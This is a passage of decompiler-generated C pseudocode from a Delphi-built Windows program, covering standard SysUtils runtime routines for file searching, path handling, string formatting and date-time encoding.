  struct _WIN32_FIND_DATAA *v8; // [esp-4h] [ebp-10h]

  *(_DWORD *)(a3 + 16) = ~a2 & 0x1E;
  v8 = (struct _WIN32_FIND_DATAA *)(a3 + 24);
  v4 = sub_4038E8(a1);
  v5 = FindFirstFileA_0(v4, v8);
  *(_DWORD *)(a3 + 20) = v5;
  if ( v5 == (HANDLE)-1 )
    return GetLastError_0();
  v6 = SysUtils::_16594(a3);
  if ( v6 )
    sub_4072B8(a3);
  return v6;
}

//----- (00407294) --------------------------------------------------------
DWORD __usercall Sysutils::FindNext@<eax>(int a1@<eax>)
{
  DWORD result; // eax

  if ( FindNextFileA(*(HANDLE *)(a1 + 20), (LPWIN32_FIND_DATAA)(a1 + 24)) )
    result = SysUtils::_16594(a1);
  else
    result = GetLastError_0();
  return result;
}

//----- (004072B8) --------------------------------------------------------
void *__usercall sub_4072B8@<eax>(int a1@<eax>)
{
  void *result; // eax

  result = *(void **)(a1 + 20);
  if ( result != (void *)-1 )
  {
    result = (void *)FindClose_0(result);
    *(_DWORD *)(a1 + 20) = -1;
  }
  return result;
}

//----- (004072D4) --------------------------------------------------------
int __usercall Sysutils::LastDelimiter@<eax>(char *a1@<eax>, char *a2@<edx>)
{
  int v4; // edi
  char *i; // ebp
  char v6; // bl

  v4 = sub_403724((int)a2);
  for ( i = sub_4038E8(a1); v4 > 0; --v4 )
  {
    v6 = a2[v4 - 1];
    if ( v6 && Sysutils::StrScan(v6, i) )
    {
      if ( (unsigned __int8)Sysutils::ByteType(v4, a2) != 2 )
        return v4;
      --v4;
    }
  }
  return v4;
}

//----- (00407324) --------------------------------------------------------
void __usercall Sysutils::ChangeFileExt(char *a1@<eax>, char *a2@<edx>, BYTE **a3@<ecx>)
{
  int v5; // eax
  int v6; // ebx
  LStr *v7; // ecx
  unsigned int v8[2]; // [esp-Ch] [ebp-20h] BYREF
  LStr *v9; // [esp-4h] [ebp-18h]
  BYTE *v10; // [esp+Ch] [ebp-8h] BYREF
  BYTE **v11; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v10 = 0;
  v11 = a3;
  v9 = (LStr *)&savedregs;
  v8[1] = (unsigned int)&loc_40739B;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v5 = Sysutils::LastDelimiter((char *)&dword_4073B4, a1);
  v6 = v5;
  if ( !v5 || a1[v5 - 1] != 46 )
    v6 = 0x7FFFFFFF;
  __linkproc__ LStrCopy(a1, 1, v6 - 1, (char **)&v10);
  System::__linkproc__ LStrCat3(v11, v10, a2);
  v7 = v9;
  __writefsdword(0, v8[0]);
  v9 = (LStr *)&loc_4073A2;
  System::__linkproc__ LStrClr(v7);
}
// 4073B4: using guessed type int dword_4073B4;

//----- (004073B8) --------------------------------------------------------
void __usercall Sysutils::ExtractFilePath(char *a1@<eax>, char **a2@<edx>)
{
  int v5; // eax

  v5 = Sysutils::LastDelimiter((char *)&dword_4073E8, a1);
  __linkproc__ LStrCopy(a1, 1, v5, a2);
}
// 4073E8: using guessed type int dword_4073E8;

//----- (004073EC) --------------------------------------------------------
void __usercall Sysutils::ExtractFileName(char *a1@<eax>, char **a2@<edx>)
{
  int v5; // eax

  v5 = Sysutils::LastDelimiter((char *)&dword_407420, a1);
  __linkproc__ LStrCopy(a1, v5 + 1, 0x7FFFFFFF, a2);
}
// 407420: using guessed type int dword_407420;

//----- (00407424) --------------------------------------------------------
void __usercall Sysutils::ExtractShortPathName(char *a1@<eax>, BYTE **a2@<edx>)
{
  char *v4; // eax
  int v5; // eax
  CHAR szShortPath[268]; // [esp+0h] [ebp-10Ch] BYREF

  v4 = sub_4038E8(a1);
  v5 = GetShortPathNameA(v4, szShortPath, 0x104u);
  __linkproc__ LStrFromPCharLen(a2, (BYTE *)szShortPath, v5);
}

//----- (0040745C) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
BOOL __stdcall System::Sysutils::_16913(LPCSTR lpRootPathName, int a2, int a3, int a4)
{
  const CHAR *v4; // eax
  BOOL v5; // ebx
  int v6; // edx
  int v7; // edx
  int v9; // [esp+4h] [ebp-18h]
  DWORD TotalNumberOfClusters; // [esp+Ch] [ebp-10h] BYREF
  DWORD NumberOfFreeClusters; // [esp+10h] [ebp-Ch] BYREF
  DWORD BytesPerSector; // [esp+14h] [ebp-8h] BYREF
  DWORD SectorsPerCluster; // [esp+18h] [ebp-4h] BYREF

  v4 = lpRootPathName;
  if ( !lpRootPathName )
    v4 = 0;
  v5 = GetDiskFreeSpaceA(v4, &SectorsPerCluster, &BytesPerSector, &NumberOfFreeClusters, &TotalNumberOfClusters);
  v9 = BytesPerSector * SectorsPerCluster;
  *(_DWORD *)a2 = System::__linkproc__ _llmul(BytesPerSector * SectorsPerCluster, NumberOfFreeClusters, 0);
  *(_DWORD *)(a2 + 4) = v6;
  *(_DWORD *)a3 = System::__linkproc__ _llmul(v9, TotalNumberOfClusters, 0);
  *(_DWORD *)(a3 + 4) = v7;
  return v5;
}
// 4074A9: variable 'v6' is possibly undefined
// 4074C3: variable 'v7' is possibly undefined

//----- (004074D0) --------------------------------------------------------
int __usercall SysUtils::_16646@<eax>(char a1@<al>, int a2@<edx>, int a3@<ecx>)
{
  char *v3; // esi
  char v5; // [esp+0h] [ebp-Ch] BYREF
  char v6[4]; // [esp+1h] [ebp-Bh] BYREF

  v3 = 0;
  if ( a1 )
  {
    v5 = a1 + 64;
    strcpy(v6, ":\\");
    v3 = &v5;
  }
  return dword_41C128(v3, a3, a2, 0);
}
// 41C128: using guessed type int (__stdcall *dword_41C128)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00407500) --------------------------------------------------------
__int64 __usercall Sysutils::DiskFree@<edx:eax>(char a1@<al>)
{
  __int64 v3; // [esp+0h] [ebp-14h] BYREF
  char v4[12]; // [esp+8h] [ebp-Ch] BYREF

  if ( !SysUtils::_16646(a1, (int)v4, (int)&v3) )
    v3 = -1i64;
  return v3;
}

//----- (00407534) --------------------------------------------------------
unsigned int __usercall sub_407534@<eax>(const char *a1@<eax>)
{
  return strlen(a1);
}

//----- (0040754C) --------------------------------------------------------
char *__usercall Sysutils::StrMove@<eax>(char *a1@<ecx>, const char *a2@<edx>, char *result@<eax>)
{
  char *v5; // esi
  char *v6; // edi
  int i; // ecx
  char *v8; // esi
  char *v9; // edi
  unsigned int j; // ecx

  if ( result > a2 )
  {
    v5 = &a1[(_DWORD)a2 - 1];
    v6 = &a1[(_DWORD)result - 1];
    for ( i = (unsigned __int8)a1 & 3; i; --i )
      *v6-- = *v5--;
    v8 = v5 - 3;
    v9 = v6 - 3;
    for ( j = (unsigned int)a1 >> 2; j; --j )
    {
      *(_DWORD *)v9 = *(_DWORD *)v8;
      v8 -= 4;
      v9 -= 4;
    }
  }
  else if ( result != a2 )
  {
    qmemcpy(result, a2, (unsigned int)a1);
  }
  return result;
}

//----- (00407588) --------------------------------------------------------
char *__usercall Sysutils::StrLCopy@<eax>(char *a1@<ecx>, const char *a2@<edx>, char *result@<eax>)
{
  const char *v3; // edi
  char *v4; // ebx
  bool v5; // zf
  unsigned int v6; // ebx
  char *v7; // edi
  int v8; // ecx

  v3 = a2;
  v4 = a1;
  v5 = a1 == 0;
  if ( a1 )
  {
    do
    {
      if ( !a1 )
        break;
      v5 = *v3++ == 0;
      --a1;
    }
    while ( !v5 );
    if ( v5 )
      ++a1;
  }
  v6 = v4 - a1;
  qmemcpy(result, a2, 4 * (v6 >> 2));
  v7 = &result[4 * (v6 >> 2)];
  v8 = v6 & 3;
  qmemcpy(v7, &a2[4 * (v6 >> 2)], v8);
  v7[v8] = 0;
  return result;
}

//----- (004075BC) --------------------------------------------------------
char *__usercall StrPCopy@<eax>(char *a1@<eax>, char *a2@<edx>)
{
  char *v5; // eax
  char *v7; // [esp-4h] [ebp-Ch]

  v7 = (char *)sub_403724((int)a2);
  v5 = sub_4038E8(a2);
  return Sysutils::StrLCopy(v7, v5, a1);
}

//----- (004075E0) --------------------------------------------------------
int __usercall Sysutils::StrLIComp@<eax>(const char *a1@<ecx>, const char *a2@<edx>, _BYTE *a3@<eax>)
{
  const char *v3; // edi
  const char *v5; // ebx
  int result; // eax
  int v7; // ecx
  const char *v8; // edi
  bool v9; // zf
  int v10; // edx

  v3 = a2;
  v5 = a1;
  result = 0;
  if ( a1 )
  {
    do
    {
      if ( !a1 )
        break;
      v9 = *v3++ == 0;
      --a1;
    }
    while ( !v9 );
    v7 = v5 - a1;
    v8 = a2;
    v10 = 0;
    v9 = 1;
    do
    {
      do
      {
        if ( !v7 )
          break;
        v9 = *a3++ == *v8++;
        --v7;
      }
      while ( v9 );
      if ( v9 )
        break;
      LOBYTE(result) = *(a3 - 1);
      if ( (unsigned __int8)result >= 0x61u && (unsigned __int8)result <= 0x7Au )
        LOBYTE(result) = result - 32;
      LOBYTE(v10) = *(v8 - 1);
      if ( (unsigned __int8)v10 >= 0x61u && (unsigned __int8)v10 <= 0x7Au )
        LOBYTE(v10) = v10 - 32;
      result -= v10;
      v9 = result == 0;
    }
    while ( !result );
  }
  return result;
}

//----- (00407628) --------------------------------------------------------
_BYTE *__usercall Sysutils::StrScan@<eax>(char a1@<dl>, _BYTE *a2@<eax>)
{
  _BYTE *v3; // edi
  int v4; // ecx
  bool v5; // zf
  int v6; // ecx
  _BYTE *v7; // edi
  _BYTE *result; // eax

  v3 = a2;
  v4 = -1;
  v5 = 1;
  do
  {
    if ( !v4 )
      break;
    v5 = *v3++ == 0;
    --v4;
  }
  while ( !v5 );
  v6 = ~v4;
  v7 = a2;
  do
  {
    if ( !v6 )
      break;
    v5 = *v7++ == (unsigned __int8)a1;
    --v6;
  }
  while ( !v5 );
  result = 0;
  if ( v5 )
    result = v7 - 1;
  return result;
}

//----- (00407648) --------------------------------------------------------
_DWORD *__usercall sub_407648@<eax>(int a1@<eax>)
{
  int v1; // ebx
  _DWORD *v2; // eax

  v1 = a1 + 4;
  v2 = (_DWORD *)sub_402598(a1 + 4);
  *v2 = v1;
  return v2 + 1;
}

//----- (0040765C) --------------------------------------------------------
char *__usercall Tntwidestrutils::WStrNew@<eax>(const char *a1@<eax>)
{
  char *v5; // esi
  char *v6; // eax

  if ( !a1 )
    return 0;
  v5 = (char *)(sub_407534(a1) + 1);
  v6 = (char *)sub_407648((int)v5);
  return Sysutils::StrMove(v5, a1, v6);
}

//----- (00407688) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
void __usercall Ansistrings::_16395(int a1@<eax>, unsigned __int8 *a2@<edx>, unsigned int a3@<ecx>)
{
  int v3; // ebx
  char v6[32]; // [esp+0h] [ebp-34h] BYREF
  char *v7; // [esp+20h] [ebp-14h]
  char v8; // [esp+24h] [ebp-10h]

  v3 = a3;
  if ( a3 > 0x1F )
    v3 = 31;
  if ( (unsigned __int8)sub_409D38(a2, v3 - 1) == 1 )
    --v3;
  Sysutils::StrMove((char *)v3, (const char *)a2, v6);
  v6[v3] = 0;
  v7 = v6;
  v8 = 6;
  SysUtils::_16482((int)off_41C14C[a1]);
}
// 41C14C: using guessed type int **off_41C14C[2];

//----- (004076E0) --------------------------------------------------------
void __usercall sub_4076E0(char **a1@<eax>, VARIANTARG *a2@<edx>)
{
  System::__linkproc__ VarToLStr(a1, a2);
}

//----- (004076F4) --------------------------------------------------------
void __thiscall sub_4076F4(LStr *this)
{
  System::__linkproc__ LStrClr(this);
}

//----- (00407700) --------------------------------------------------------
_BYTE *__userpurge Sysutils::FormatBuf@<eax>(unsigned __int8 *a1@<eax>, unsigned int a2@<edx>, unsigned __int8 *a3@<ecx>, int a4, int a5, int a6)
{
  unsigned __int8 *v6; // edi
  unsigned __int8 *v7; // esi
  unsigned __int8 *v8; // ecx
  unsigned __int8 v9; // al
  _BYTE *result; // eax
  unsigned __int8 *v11; // ebx
  unsigned __int8 v12; // al
  unsigned int v13; // edx
  unsigned __int8 v14; // al
  unsigned int v15; // ecx
  unsigned int v16; // edx
  unsigned int v17; // ebx
  unsigned int v18; // ecx
  unsigned int v19; // ebx
  unsigned int v20; // et0
  bool v21; // cf
  unsigned int v22; // edx
  unsigned __int8 *v23; // edi
  unsigned int v24; // ecx
  unsigned int v25; // [esp-14h] [ebp-8Ch]
  unsigned __int8 *v26; // [esp-10h] [ebp-88h]
  unsigned __int8 *v27; // [esp+54h] [ebp-24h]
  unsigned int v28; // [esp+5Ch] [ebp-1Ch]
  unsigned __int8 v29; // [esp+63h] [ebp-15h]
  int savedregs; // [esp+78h] [ebp+0h] BYREF

  v6 = a1;
  v7 = a3;
  v8 = &a3[a6];
LABEL_2:
  if ( a2 )
  {
    while ( v7 != v8 )
    {
      v9 = *v7++;
      if ( v9 == 37 )
      {
        if ( v7 == v8 )
          break;
        v9 = *v7++;
        if ( v9 != 37 )
        {
          v11 = v7 - 2;
          while ( 1 )
          {
            v29 = v9;
            if ( v9 == 45 )
            {
              if ( v7 == v8 )
                goto LABEL_6;
              v9 = *v7++;
            }
            v12 = sub_4077E2(v9, v8, (int)&savedregs, v7);
            if ( v12 != 58 )
              break;
            if ( v7 == v8 )
              goto LABEL_6;
            v9 = *v7++;
          }
          v28 = (unsigned int)v11;
          if ( v12 == 46 )
          {
            if ( v7 == v8 )
              break;
            v14 = *v7++;
            v12 = sub_4077E2(v14, v8, (int)&savedregs, v7);
          }
          v27 = v7;
          v26 = v8;
          v25 = v13;
          sub_40782B(v12, (LStr *)v8, (int)&savedregs, (void (__usercall *)(BYTE **@<eax>, int@<edx>))v7);
          v16 = v25;
          v17 = (unsigned int)&v11[-v15];
          if ( v28 < v15 )
            v17 = 0;
          if ( v29 == 45 )
          {
            v16 = v25 - v15;
            if ( v25 < v15 )
            {
              v15 = v25;
              v16 = 0;
            }
            qmemcpy(v6, v7, v15);
            v7 += v15;
            v6 += v15;
            v15 = 0;
          }
          v20 = v15;
          v18 = v17;
          v19 = v20;
          v21 = v16 < v18;
          v22 = v16 - v18;
          if ( v21 )
          {
            v18 += v22;
            v22 = 0;
          }
          memset(v6, 32, v18);
          v23 = &v6[v18];
          v24 = v19;
          v21 = v22 < v19;
          a2 = v22 - v19;
          if ( v21 )
          {
            v24 = a2 + v19;
            a2 = 0;
          }
          qmemcpy(v23, v7, v24);
          v6 = &v23[v24];
          v8 = v26;
          v7 = v27;
          goto LABEL_2;
        }
      }
      *v6++ = v9;
      if ( !--a2 )
        break;
    }
  }
LABEL_6:
  result = (_BYTE *)(v6 - a1);
  sub_407ADD((LStr *)v8);
  return result;
}
// 4077CD: conditional instruction was optimized away because of '%var_C.4==0'
// 407AE8: variable 'v8' is possibly undefined
// 40778F: variable 'v13' is possibly undefined
// 407799: variable 'v15' is possibly undefined

//----- (004077E2) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
unsigned __int8 __usercall sub_4077E2@<al>(unsigned __int8 result@<al>, unsigned __int8 *a2@<ecx>, int a3@<ebp>, unsigned __int8 *a4@<esi>)
{
  int v4; // ebx

  v4 = 0;
  if ( result == 42 )
  {
    if ( *(_DWORD *)(a3 - 8) <= *(_DWORD *)(a3 + 8) )
      ++*(_DWORD *)(a3 - 8);
    if ( a4 == a2 )
LABEL_12:
      JUMPOUT(0x407736);
    result = *a4;
  }
  else
  {
    while ( result >= 0x30u && result <= 0x39u )
    {
      v4 = (unsigned __int8)(result - 48) + 10 * v4;
      if ( a4 == a2 )
        goto LABEL_12;
      result = *a4++;
    }
  }
  return result;
}
// 407806: positive sp value 4 has been found
// 407806: control flows out of bounds to 407736

//----- (0040782B) --------------------------------------------------------
void __usercall sub_40782B(char a1@<al>, LStr *a2@<ecx>, int a3@<ebp>, void (__usercall *a4)(BYTE **a1@<eax>, int a2@<edx>)@<esi>)
{
  int v4; // eax
  unsigned int v5; // ebx
  signed int v6; // eax
  int v7; // ebx
  bool v8; // cf
  _BYTE *v9; // edi
  int v10; // ecx
  bool v11; // zf
  char v12; // bh
  unsigned __int8 v13; // bl
  unsigned int v14; // eax
  unsigned int v15; // edx

  LOBYTE(a2) = a1 & 0xDF;
  v4 = 1;
  v5 = *(_DWORD *)(a3 - 8);
  if ( v5 > *(_DWORD *)(a3 + 8) )
    goto LABEL_4;
  ++*(_DWORD *)(a3 - 8);
  a4 = (void (__usercall *)(BYTE **@<eax>, int@<edx>))(*(_DWORD *)(a3 + 12) + 8 * v5);
  v6 = *(_DWORD *)a4;
  switch ( *((_BYTE *)a4 + 4) )
  {
    case 0:
      switch ( (_BYTE)a2 )
      {
        case 'D':
          if ( v6 < 0 )
          {
            sub_407972(-v6, a3);
            *((_BYTE *)a4 - 1) = 45;
            return;
          }
          goto LABEL_55;
        case 'U':
LABEL_55:
          sub_407972(v6, a3);
          return;
        case 'X':
LABEL_56:
          JUMPOUT(0x407977);
      }
LABEL_3:
      while ( 1 )
      {
        v4 = 0;
LABEL_4:
        sub_407ADD(a2);
        Ansistrings::_16395(v4, *(unsigned __int8 **)(a3 - 20), *(_DWORD *)(a3 - 36) - *(_DWORD *)(a3 - 20));
LABEL_5:
        v7 = a3 - 48;
        *(_DWORD *)v7 = *(_DWORD *)v6;
        *(_DWORD *)(v7 + 4) = *(_DWORD *)(v6 + 4);
        if ( (_BYTE)a2 == 68 )
          break;
        if ( (_BYTE)a2 == 85 )
          goto LABEL_52;
        if ( (_BYTE)a2 == 88 )
          JUMPOUT(0x4078F0);
      }
      if ( *(int *)(v7 + 4) < 0 )
      {
        v8 = *(_DWORD *)v7 != 0;
        *(_DWORD *)v7 = -*(_DWORD *)v7;
        *(_DWORD *)(v7 + 4) += v8;
        *(_DWORD *)(v7 + 4) = -*(_DWORD *)(v7 + 4);
        sub_4078EB((unsigned __int64 *)v7, a3);
        *((_BYTE *)a4 - 1) = 45;
        return;
      }
LABEL_52:
      sub_4078EB((unsigned __int64 *)v7, a3);
      return;
    case 1:
    case 7:
    case 8:
    case 9:
    case 0xE:
      goto LABEL_3;
    case 2:
      if ( (_BYTE)a2 == 83 )
        return;
      goto LABEL_3;
    case 3:
      v12 = 0;
      goto LABEL_40;
    case 4:
      if ( (_BYTE)a2 == 83 )
        return;
      goto LABEL_3;
    case 5:
      if ( (_BYTE)a2 != 80 )
        goto LABEL_3;
      *(_DWORD *)(a3 - 32) = 8;
      goto LABEL_56;
    case 6:
      if ( (_BYTE)a2 != 83 )
        goto LABEL_3;
      v9 = *(_BYTE **)a4;
      v10 = *(_DWORD *)(a3 - 32);
      if ( v10 )
      {
        do
        {
          if ( !v10 )
            break;
          v11 = *v9++ == 0;
          --v10;
        }
        while ( !v11 );
      }
      return;
    case 0xA:
      a4 = __linkproc__ LStrFromPWChar;
      goto LABEL_27;
    case 0xB:
      if ( (_BYTE)a2 == 83 )
        return;
      goto LABEL_3;
    case 0xC:
      v12 = 1;
LABEL_40:
      a4 = *(void (__usercall **)(BYTE **@<eax>, int@<edx>))a4;
      v13 = 0;
      if ( (_BYTE)a2 == 71 || (v13 = 1, (_BYTE)a2 == 69) )
      {
        v14 = *(_DWORD *)(a3 - 32);
        v15 = 3;
        if ( v14 > 0x12 )
          v14 = 15;
      }
      else
      {
        v13 = 2;
        if ( (_BYTE)a2 != 70 )
        {
          v13 = 3;
          if ( (_BYTE)a2 != 78 )
          {
            if ( (_BYTE)a2 != 77 )
              goto LABEL_3;
            v13 = 4;
          }
        }
        v14 = 18;
        v15 = *(_DWORD *)(a3 - 32);
        if ( v15 > 0x12 )
        {
          v15 = 2;
          if ( (_BYTE)a2 == 77 )
            v15 = (unsigned __int8)byte_41E4F0;
        }
      }
      FLOATTOTEXT((_BYTE *)(a3 - 113), (int)a4, v12, v15, v14, v13);
      return;
    case 0xD:
      if ( (_BYTE)a2 != 83 )
        goto LABEL_3;
      if ( *(_WORD *)v6 > 1u )
        sub_4076E0((char **)(a3 - 12), *(VARIANTARG **)a4);
      return;
    case 0xF:
      a4 = (void (__usercall *)(BYTE **@<eax>, int@<edx>))sub_403710;
LABEL_27:
      if ( (_BYTE)a2 != 83 )
        goto LABEL_3;
      a4((BYTE **)(a3 - 16), v6);
      return;
    case 0x10:
      goto LABEL_5;
  }
}
// 4078CB: control flows out of bounds to 4078F0
// 40795E: control flows out of bounds to 407977
// 407898: variable 'a2' is possibly undefined
// 4078AD: variable 'v6' is possibly undefined
// 403710: using guessed type int sub_403710();
// 41E4F0: using guessed type char byte_41E4F0;

//----- (004078EB) --------------------------------------------------------
int __usercall sub_4078EB@<eax>(unsigned __int64 *a1@<ebx>, int a2@<ebp>)
{
  int v2; // esi
  unsigned __int8 v3; // dl
  unsigned __int64 v4; // rax
  int result; // eax
  unsigned int v6; // ecx
  unsigned int v7; // edx
  bool v8; // cc
  unsigned int v9; // edx

  v2 = a2 - 81;
  do
  {
    v3 = *a1 % 0xA + 48;
    if ( v3 >= 0x3Au )
      v3 = *a1 % 0xA + 55;
    *(_BYTE *)--v2 = v3;
    v4 = *a1 / 0xA;
    *a1 = v4;
    result = HIDWORD(v4) | v4;
  }
  while ( result );
  v6 = a2 - 81 - v2;
  v7 = *(_DWORD *)(a2 - 32);
  if ( v7 <= 0x10 )
  {
    v8 = v7 <= v6;
    v9 = v7 - v6;
    if ( !v8 )
    {
      LOBYTE(result) = 48;
      do
      {
        *(_BYTE *)--v2 = 48;
        --v9;
      }
      while ( v9 );
    }
  }
  return result;
}

//----- (00407972) --------------------------------------------------------
unsigned int __usercall sub_407972@<eax>(unsigned int result@<eax>, int a2@<ebp>)
{
  int v2; // esi
  unsigned int v3; // et2
  char v4; // dl
  unsigned int v5; // ecx
  unsigned int v6; // edx
  bool v7; // cc
  unsigned int v8; // edx

  v2 = a2 - 97;
  do
  {
    v3 = result % 0xA;
    result /= 0xAu;
    v4 = v3 + 48;
    if ( (unsigned __int8)(v3 + 48) >= 0x3Au )
      v4 += 7;
    *(_BYTE *)--v2 = v4;
  }
  while ( result );
  v5 = a2 - 97 - v2;
  v6 = *(_DWORD *)(a2 - 32);
  if ( v6 <= 0x10 )
  {
    v7 = v6 <= v5;
    v8 = v6 - v5;
    if ( !v7 )
    {
      LOBYTE(result) = 48;
      do
      {
        *(_BYTE *)--v2 = 48;
        --v8;
      }
      while ( v8 );
    }
  }
  return result;
}

//----- (00407ADD) --------------------------------------------------------
void __thiscall __spoils<edx,ecx> sub_407ADD(LStr *this)
{
  System::__linkproc__ LStrClr(this);
}

//----- (00407AF8) --------------------------------------------------------
unsigned __int8 *__userpurge Sysutils::StrLFmt@<eax>(int a1@<ecx>, int a2@<edx>, unsigned __int8 *a3@<eax>, char *a4, int a5, int a6)
{
  int v9; // eax

  v9 = sub_407534((const char *)a1);
  Sysutils::FormatBuf(a3, a2, (unsigned __int8 *)a1, (int)a4, a5, v9)[(_DWORD)a3] = 0;
  return a3;
}

//----- (00407B2C) --------------------------------------------------------
void __userpurge sub_407B2C(unsigned __int8 *a1@<eax>, int a2@<edx>, int a3@<ecx>, BYTE **a4)
{
  FmtStr(a4, a1, a2, a3);
}

//----- (00407B40) --------------------------------------------------------
void __userpurge FmtStr(BYTE **a1@<eax>, unsigned __int8 *a2@<edx>, int a3@<ecx>, int a4)
{
  int v5; // ebx
  int v6; // eax
  _BYTE *v7; // eax
  LStr *v8; // ecx
  LStr *v9; // ecx
  int v10; // eax
  unsigned __int8 v11[10]; // [esp+0h] [ebp-100Ah] BYREF
  BYTE **v12; // [esp+Ah] [ebp-1000h]
  int v13; // [esp+1002h] [ebp-8h]
  unsigned __int8 *v14; // [esp+1006h] [ebp-4h]

  v12 = a1;
  v13 = a3;
  v14 = a2;
  v5 = 4098;
  if ( sub_403724((int)a2) >= 3074 )
  {
    v7 = (_BYTE *)sub_403724((int)v14);
    v5 = (int)v7;
  }
  else
  {
    v6 = sub_403724((int)v14);
    v7 = Sysutils::FormatBuf(v11, 0x1001u, v14, a4, v13, v6);
  }
  if ( (int)v7 < v5 - 1 )
  {
    __linkproc__ LStrFromPCharLen(a1, v11, (int)v7);
  }
  else
  {
    while ( (int)v7 >= v5 - 1 )
    {
      v5 *= 2;
      System::__linkproc__ LStrClr(v8);
      System::__linkproc__ LStrSetLength(a1, v5, v9);
      v10 = sub_403724((int)v14);
      v7 = Sysutils::FormatBuf(*a1, v5 - 1, v14, a4, v13, v10);
    }
    System::__linkproc__ LStrSetLength(a1, (int)v7, v8);
  }
}
// 407BB5: variable 'v8' is possibly undefined
// 407BBE: variable 'v9' is possibly undefined

//----- (00407C08) --------------------------------------------------------
int __userpurge Sysutils::DateTimeToTimeStamp@<eax>(_DWORD *a1@<eax>, double a2)
{
  unsigned __int64 v3; // rax
  int v4; // eax
  int v5; // edx
  unsigned __int64 v6; // rt2
  int v7; // eax
  unsigned __int64 v8; // rt2
  int result; // eax

  v3 = (__int64)(a2 * flt_41C154);
  if ( (v3 & 0x8000000000000000ui64) == 0i64 )
  {
    v8 = v3 % (unsigned int)dword_41C158;
    v7 = v3 / (unsigned int)dword_41C158;
    v5 = v8;
  }
  else
  {
    v6 = -(__int64)v3 % (unsigned __int64)(unsigned int)dword_41C158;
    v4 = -(__int64)v3 / (unsigned __int64)(unsigned int)dword_41C158;
    v5 = v6;
    v7 = -v4;
  }
  result = v7 + 693594;
  *a1 = v5;
  a1[1] = result;
  return result;
}
// 41C154: using guessed type float flt_41C154;
// 41C158: using guessed type int dword_41C158;

//----- (00407C48) --------------------------------------------------------
char __userpurge Sysutils::TryEncodeTime@<al>(unsigned __int16 a1@<ax>, unsigned __int16 a2@<dx>, unsigned __int16 a3@<cx>, double *a4, unsigned __int16 a5)
{
  char v6; // [esp+Bh] [ebp-1h]

  v6 = 0;
  if ( a1 < 0x18u && a2 < 0x3Cu && a3 < 0x3Cu && a5 < 0x3E8u )
  {
    *a4 = (double)(a5 + 1000 * a3 + 60000 * a2 + 3600000 * a1) / 86400000.0;
    v6 = 1;
  }
  return v6;
}

//----- (00407CB8) --------------------------------------------------------
double __userpurge Sysutils::EncodeTime@<st0>(unsigned __int16 a1@<cx>, unsigned __int16 a2@<dx>, unsigned __int16 a3@<ax>, unsigned __int16 a4, unsigned __int16 a5)
{
  void *v5; // edx
  int v6; // ecx
  LStr *v7; // ecx
  unsigned int v9[2]; // [esp-Ch] [ebp-24h] BYREF
  LStr *v10; // [esp-4h] [ebp-1Ch]
  BYTE *v11; // [esp+Ch] [ebp-Ch] BYREF
  double v12; // [esp+10h] [ebp-8h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v11 = 0;
  v10 = (LStr *)&savedregs;
  v9[1] = (unsigned int)&loc_407D1D;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  if ( !Sysutils::TryEncodeTime(a3, a2, a1, &v12, a4) )
  {
    System::LoadResString((int)off_41DBA8[0], &v11);
    sub_406CBC(v6, v5);
  }
  v7 = v10;
  __writefsdword(0, v9[0]);
  v10 = (LStr *)&loc_407D24;
  System::__linkproc__ LStrClr(v7);
  return v12;
}
// 407D02: variable 'v6' is possibly undefined
// 407D02: variable 'v5' is possibly undefined
// 41DBA8: using guessed type int **off_41DBA8[18];

//----- (00407D30) --------------------------------------------------------
// Borland Visual Component Library & Packages
unsigned int __userpurge Sysutils::DecodeTime@<eax>(_WORD *a1@<eax>, _WORD *a2@<edx>, _WORD *a3@<ecx>, int a4, double a5)
{
  unsigned int v9; // [esp+Ch] [ebp-Ch] BYREF
  unsigned __int16 v10; // [esp+14h] [ebp-4h] BYREF
  unsigned __int16 v11; // [esp+16h] [ebp-2h] BYREF

  Sysutils::DateTimeToTimeStamp(&v9, a5);
  sub_406CA0(v9, 0xEA60u, &v11, &v10);
  sub_406CA0(v11, 0x3Cu, a1, a2);
  return sub_406CA0(v10, 0x3E8u, a3, (_WORD *)a4);
}

//----- (00407D8C) --------------------------------------------------------
bool __usercall Sysutils::IsLeapYear@<al>(unsigned __int16 a1@<ax>)
{
  return (a1 & 3) == 0 && (a1 % 0x64u || !(a1 % 0x190u));
}

//----- (00407DC8) --------------------------------------------------------
char __userpurge Sysutils::TryEncodeDate@<al>(unsigned __int16 a1@<ax>, unsigned __int16 a2@<dx>, unsigned __int16 a3@<cx>, double *a4)
{
  char *v6; // esi
  int v7; // eax
  int v8; // ecx
  char v10; // [esp+11h] [ebp-3h]

  v10 = 0;
  v6 = (char *)&unk_41C0D4 + 24 * (Sysutils::IsLeapYear(a1) & 0x7F);
  if ( a1 && a1 <= 0x270Fu && a2 && a2 <= 0xCu && a3 && a3 <= *(_WORD *)&v6[2 * a2 - 2] )
  {
    v7 = a2 - 1;
    if ( v7 > 0 )
    {
      v8 = 1;
      do
      {
        a3 += *(_WORD *)&v6[2 * v8++ - 2];
        --v7;
      }
      while ( v7 );
    }
    *a4 = (double)(a3 + (a1 - 1) / 400 + (a1 - 1) / 4 + 365 * (a1 - 1) - (a1 - 1) / 100 - 693594);
    v10 = 1;
  }
  return v10;
}

//----- (00407E90) --------------------------------------------------------
double __usercall Sysutils::EncodeDate@<st0>(unsigned __int16 a1@<cx>, unsigned __int16 a2@<ax>, unsigned __int16 a3@<dx>)
{
  void *v3; // edx
  int v4; // ecx
  LStr *v5; // ecx
  unsigned int v7[2]; // [esp-Ch] [ebp-24h] BYREF
  LStr *v8; // [esp-4h] [ebp-1Ch]
  BYTE *v9; // [esp+Ch] [ebp-Ch] BYREF
  double v10; // [esp+10h] [ebp-8h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v9 = 0;
  v8 = (LStr *)&savedregs;
  v7[1] = (unsigned int)&loc_407EF0;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
